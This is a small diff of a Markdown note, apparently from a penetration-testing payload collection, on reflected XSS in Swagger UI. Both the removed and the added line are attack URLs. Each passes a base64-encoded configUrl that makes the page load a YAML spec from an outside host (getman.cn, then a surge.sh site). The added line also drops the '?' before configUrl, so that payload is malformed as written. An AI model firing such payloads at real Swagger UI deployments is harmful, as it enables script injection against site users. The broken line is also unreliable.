@@ -1,7 +1,7 @@
 ### swagger-ui 反射型xss
 
 ```txt
-/swagger-ui.html?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9nZXRtYW4uY24vbW9jay90ZXN0L3Rlc3QyLnlhbWwiCn0=
+/swagger-ui.htmlconfigUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==
 ```
 
 * header:
